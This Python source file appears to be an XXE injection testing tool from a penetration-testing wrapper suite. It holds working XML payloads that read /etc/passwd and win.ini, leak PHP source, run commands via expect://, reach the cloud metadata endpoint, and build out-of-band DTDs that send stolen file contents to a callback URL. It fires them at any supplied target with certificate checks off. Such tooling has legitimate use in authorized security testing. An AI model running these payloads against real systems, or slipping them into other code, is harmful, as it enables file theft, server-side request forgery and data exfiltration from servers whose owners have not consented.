"""
XXE (XML External Entity) Injection Testing Wrapper

Tests for XXE vulnerabilities including:
- Basic external entity injection
- Parameter entity injection
- Blind/OOB XXE detection
- CDATA exfiltration
- PHP filter wrapper
- SSRF via XXE
- Error-based extraction
"""
import sys
import argparse
import json
import requests
from pathlib import Path
from typing import Dict, List, Any, Optional
from dataclasses import dataclass
from urllib.parse import urlparse

sys.path.insert(0, str(Path(__file__).parent.parent.parent))

from utils.base_wrapper import BaseToolWrapper


@dataclass
class XXEFinding:
    """Represents an XXE finding"""
    payload_type: str
    payload: str
    status_code: int
    response_length: int
    potential_vuln: bool
    evidence: Optional[str] = None
    response_time: Optional[float] = None


class XXEInjector(BaseToolWrapper):
    """XXE injection testing wrapper with multiple attack vectors."""

    # Basic XXE payloads
    XXE_PAYLOADS = {
        # Basic external entity - file read
        'basic_file': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>''',

        # Windows file read
        'basic_file_win': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<root>&xxe;</root>''',

        # Parameter entity (for blind XXE)
        'parameter_entity': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "file:///etc/passwd">
  %xxe;
]>
<root>test</root>''',

        # PHP filter wrapper
        'php_filter': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
]>
<root>&xxe;</root>''',

        # PHP filter for source code
        'php_filter_source': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
<root>&xxe;</root>''',

        # SSRF via XXE
        'ssrf_localhost': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://127.0.0.1/">
]>
<root>&xxe;</root>''',

        # SSRF to cloud metadata
        'ssrf_aws': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>&xxe;</root>''',

        # Expect wrapper (PHP)
        'expect_wrapper': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "expect://id">
]>
<root>&xxe;</root>''',

        # UTF-7 encoding bypass
        'utf7_bypass': '''<?xml version="1.0" encoding="UTF-7"?>
+ADw-!DOCTYPE foo +AFs-
  +ADw-!ENTITY xxe SYSTEM +ACI-file:///etc/passwd+ACI-+AD4-
+AF0-+AD4-
+ADw-root+AD4-+ACY-xxe+ADs-+ADw-/root+AD4-''',

        # DTD inclusion (external)
        'external_dtd': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo SYSTEM "{callback_url}/xxe.dtd">
<root>test</root>''',
    }

    # Blind XXE payloads (require callback URL)
    BLIND_XXE_PAYLOADS = {
        # OOB data exfiltration via HTTP
        'oob_http': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "{callback_url}/xxe.dtd">
  %dtd;
]>
<root>test</root>''',

        # OOB data exfiltration via FTP
        'oob_ftp': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "{callback_url}/xxe.dtd">
  %dtd;
  %send;
]>
<root>test</root>''',

        # Error-based extraction
        'error_based': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %error;
]>
<root>test</root>''',
    }

    # CDATA XXE payloads
    CDATA_PAYLOADS = {
        'cdata_exfil': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % start "<![CDATA[">
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % end "]]>">
  <!ENTITY % dtd SYSTEM "{callback_url}/xxe-cdata.dtd">
  %dtd;
]>
<root>&all;</root>''',
    }

    # XXE vulnerability indicators
    FILE_INDICATORS = {
        'linux': [
            'root:x:', 'root:*:', 'daemon:', 'bin:', 'sys:', 'nobody:',
            '/bin/bash', '/bin/sh', '/usr/sbin/nologin',
        ],
        'windows': [
            '[extensions]', '[fonts]', 'for 16-bit app support',
            'MSDOS.SYS', 'WINA20.386',
        ],
        'general': [
            '<?php', '<?=', 'function ', 'class ', 'namespace ',
            'SELECT ', 'INSERT ', 'UPDATE ', 'DELETE ',
            'private_key', 'secret_key', 'password=', 'passwd=',
        ]
    }

    ERROR_INDICATORS = [
        'parser error', 'xml error', 'xmlparserentity',
        'simplexml', 'domdocument', 'libxml', 'lxml',
        'entity', 'doctype', 'dtd', 'external entity',
        'not allowed', 'forbidden', 'blocked',
    ]

    @property
    def tool_name(self) -> str:
        return "xxe_injector"

    @property
    def tool_category(self) -> str:
        return "advanced"

    def _build_target_args(self, target: str, **kwargs) -> list:
        """XXE injector doesn't use CLI - this returns empty"""
        return []

    def check_tool_installed(self) -> bool:
        """Override - this tool is pure Python"""
        try:
            import requests
            return True
        except ImportError:
            return False

    def test_xxe(self, url: str, callback_url: Optional[str] = None,
                 headers: Optional[Dict] = None, cookies: Optional[Dict] = None,
                 timeout: int = 15) -> List[XXEFinding]:
        """Test for XXE vulnerabilities with comprehensive payload set."""
        findings = []
        headers = headers or {}

        # Ensure Content-Type is set for XML
        if 'Content-Type' not in headers:
            headers['Content-Type'] = 'application/xml'

        # Test basic XXE payloads
        print("[*] Testing basic XXE payloads...")
        for name, payload in self.XXE_PAYLOADS.items():
            if '{callback_url}' in payload:
                if callback_url:
                    payload = payload.replace('{callback_url}', callback_url)
                else:
                    continue

            finding = self._test_payload(url, name, payload, headers, cookies, timeout)
            findings.append(finding)

        # Test blind XXE payloads (if callback URL provided)
        if callback_url:
            print("[*] Testing blind/OOB XXE payloads...")
            for name, payload in self.BLIND_XXE_PAYLOADS.items():
                payload = payload.replace('{callback_url}', callback_url)
                finding = self._test_payload(url, name, payload, headers, cookies, timeout)
                findings.append(finding)

            # Test CDATA payloads
            print("[*] Testing CDATA XXE payloads...")
            for name, payload in self.CDATA_PAYLOADS.items():
                payload = payload.replace('{callback_url}', callback_url)
                finding = self._test_payload(url, name, payload, headers, cookies, timeout)
                findings.append(finding)

        return findings

    def test_specific_file(self, url: str, file_path: str,
                          headers: Optional[Dict] = None, cookies: Optional[Dict] = None,
                          timeout: int = 15) -> XXEFinding:
        """Test XXE to read a specific file."""
        headers = headers or {'Content-Type': 'application/xml'}

        payload = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file://{file_path}">
]>
<root>&xxe;</root>'''

        return self._test_payload(url, f'file_read_{file_path}', payload, headers, cookies, timeout)

    def test_ssrf_via_xxe(self, url: str, ssrf_target: str,
                         headers: Optional[Dict] = None, cookies: Optional[Dict] = None,
                         timeout: int = 15) -> XXEFinding:
        """Test SSRF via XXE."""
        headers = headers or {'Content-Type': 'application/xml'}

        payload = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "{ssrf_target}">
]>
<root>&xxe;</root>'''

        return self._test_payload(url, f'ssrf_{ssrf_target}', payload, headers, cookies, timeout)

    def test_with_custom_payload(self, url: str, payload: str, payload_name: str = 'custom',
                                 headers: Optional[Dict] = None, cookies: Optional[Dict] = None,
                                 timeout: int = 15) -> XXEFinding:
        """Test with a custom XXE payload."""
        headers = headers or {'Content-Type': 'application/xml'}
        return self._test_payload(url, payload_name, payload, headers, cookies, timeout)

    def generate_dtd_payload(self, file_path: str, callback_url: str) -> str:
        """Generate external DTD file content for OOB XXE."""
        return f'''<!ENTITY % file SYSTEM "file://{file_path}">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM '{callback_url}/?data=%file;'>">
%eval;
%exfil;'''

    def generate_cdata_dtd(self, callback_url: str) -> str:
        """Generate CDATA DTD for exfiltration."""
        return f'''<!ENTITY % all "<!ENTITY &#x25; send SYSTEM '{callback_url}/?data=%start;%file;%end;'>">
%all;'''

    def _test_payload(self, url: str, payload_name: str, payload: str,
                      headers: Dict, cookies: Optional[Dict], timeout: int) -> XXEFinding:
        """Send request with XXE payload."""
        try:
            response = requests.post(
                url,
                data=payload,
                headers=headers,
                cookies=cookies,
                timeout=timeout,
                allow_redirects=False,
                verify=False
            )

            vuln_detected = self._detect_xxe(response)

            return XXEFinding(
                payload_type=payload_name,
                payload=payload[:500],  # Truncate for storage
                status_code=response.status_code,
                response_length=len(response.text),
                potential_vuln=vuln_detected,
                evidence=response.text[:500] if vuln_detected else None,
                response_time=response.elapsed.total_seconds()
            )
        except requests.exceptions.Timeout:
            return XXEFinding(
                payload_type=payload_name,
                payload=payload[:500],
                status_code=0,
                response_length=0,
                potential_vuln=True,  # Timeout might indicate external entity fetch
                evidence='Request timed out - possible external entity loading',
                response_time=timeout
            )
        except Exception as e:
            return XXEFinding(
                payload_type=payload_name,
                payload=payload[:500],
                status_code=0,
                response_length=0,
                potential_vuln=False,
                evidence=str(e)[:200],
                response_time=0
            )

    def _detect_xxe(self, response: requests.Response) -> bool:
        """Detect XXE indicators in response."""
        text_lower = response.text.lower()

        # Check for file content indicators
        for os_type, indicators in self.FILE_INDICATORS.items():
            if any(ind.lower() in text_lower for ind in indicators):
                return True

        # Check for error messages that might leak info
        if any(err in text_lower for err in self.ERROR_INDICATORS):
            return True

        # Check for base64 encoded content (PHP filter)
        import re
        base64_pattern = r'[A-Za-z0-9+/]{50,}={0,2}'
        if re.search(base64_pattern, response.text):
            # Try to decode and check for indicators
            try:
                import base64
                matches = re.findall(base64_pattern, response.text)
                for match in matches[:5]:  # Check first 5 matches
                    try:
                        decoded = base64.b64decode(match).decode('utf-8', errors='ignore').lower()
                        for indicators in self.FILE_INDICATORS.values():
                            if any(ind.lower() in decoded for ind in indicators):
                                return True
                    except:
                        pass
            except:
                pass

        return False

    def run(self, target: str, output_file: str = None, **kwargs) -> Dict[str, Any]:
        """Run XXE tests."""
        from datetime import datetime

        self.start_time = datetime.now()

        callback_url = kwargs.get('callback_url')
        headers = kwargs.get('headers')
        cookies = kwargs.get('cookies')
        timeout = kwargs.get('timeout', 15)
        file_path = kwargs.get('file_path')
        ssrf_target = kwargs.get('ssrf_target')

        all_findings = []

        print(f"[*] Testing XXE on {target}")

        if file_path:
            print(f"[*] Testing specific file read: {file_path}")
            finding = self.test_specific_file(
                url=target, file_path=file_path,
                headers=headers, cookies=cookies, timeout=timeout
            )
            all_findings.append(finding)
        elif ssrf_target:
            print(f"[*] Testing SSRF via XXE: {ssrf_target}")
            finding = self.test_ssrf_via_xxe(
                url=target, ssrf_target=ssrf_target,
                headers=headers, cookies=cookies, timeout=timeout
            )
            all_findings.append(finding)
        else:
            findings = self.test_xxe(
                url=target, callback_url=callback_url,
                headers=headers, cookies=cookies, timeout=timeout
            )
            all_findings.extend(findings)

        self.end_time = datetime.now()
        duration = (self.end_time - self.start_time).total_seconds()

        # Filter vulnerable findings
        vulnerable = [f for f in all_findings if f.potential_vuln]

        # Save results
        if output_file is None:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            output_file = self.output_dir / f"xxe_test_{timestamp}.json"

        results_data = {
            'target': target,
            'total_tests': len(all_findings),
            'vulnerable_count': len(vulnerable),
            'findings': [
                {
                    'payload_type': f.payload_type,
                    'status_code': f.status_code,
                    'response_length': f.response_length,
                    'potential_vuln': f.potential_vuln,
                    'evidence': f.evidence,
                    'response_time': f.response_time
                }
                for f in all_findings
            ]
        }

        with open(output_file, 'w') as f:
            json.dump(results_data, f, indent=2)
        print(f"[+] Results saved to: {output_file}")

        return {
            'success': True,
            'tool': self.tool_name,
            'target': target,
            'duration': duration,
            'output_file': str(output_file),
            'results': all_findings,
            'vulnerable_count': len(vulnerable)
        }


def main():
    parser = argparse.ArgumentParser(
        description="XXE Injector - Test for XML External Entity injection vulnerabilities",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python xxe_injector.py -u "https://example.com/api/xml"
  python xxe_injector.py -u "https://example.com/upload" --callback http://your-callback.com
  python xxe_injector.py -u "https://example.com/parse" --file /etc/passwd
  python xxe_injector.py -u "https://example.com/process" --ssrf http://169.254.169.254/latest/meta-data/
        """
    )

    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("--callback", help="OOB callback URL for blind XXE")
    parser.add_argument("--file", dest="file_path", help="Specific file to read")
    parser.add_argument("--ssrf", dest="ssrf_target", help="SSRF target URL via XXE")
    parser.add_argument("-H", "--header", action="append", dest="headers",
                       help="Custom header (format: 'Name: Value')")
    parser.add_argument("--cookie", help="Cookie string")
    parser.add_argument("-t", "--timeout", type=int, default=15,
                       help="Request timeout in seconds (default: 15)")
    parser.add_argument("-o", "--output", help="Output file path")

    args = parser.parse_args()

    # Parse headers
    headers = {'Content-Type': 'application/xml'}
    if args.headers:
        for h in args.headers:
            if ':' in h:
                name, value = h.split(':', 1)
                headers[name.strip()] = value.strip()

    # Parse cookies
    cookies = None
    if args.cookie:
        cookies = {}
        for cookie in args.cookie.split(';'):
            if '=' in cookie:
                name, value = cookie.split('=', 1)
                cookies[name.strip()] = value.strip()

    tester = XXEInjector()

    result = tester.run(
        target=args.url,
        callback_url=args.callback,
        file_path=args.file_path,
        ssrf_target=args.ssrf_target,
        headers=headers,
        cookies=cookies,
        timeout=args.timeout,
        output_file=args.output
    )

    # Print summary
    print(f"\n{'='*60}")
    print(f"XXE Injection Test Results")
    print(f"{'='*60}")
    print(f"Target: {args.url}")
    print(f"Total Tests: {len(result['results'])}")
    print(f"Potential Vulnerabilities: {result['vulnerable_count']}")

    if result['vulnerable_count'] > 0:
        print(f"\n[!] POTENTIAL XXE VULNERABILITY FOUND!")
        for finding in result['results']:
            if finding.potential_vuln:
                print(f"\n  Payload Type: {finding.payload_type}")
                print(f"  Status Code: {finding.status_code}")
                if finding.evidence:
                    print(f"  Evidence: {finding.evidence[:300]}...")
    else:
        print("\n[+] No XXE vulnerabilities detected")

    return 0 if result['success'] else 1


if __name__ == "__main__":
    # Suppress SSL warnings
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    sys.exit(main())
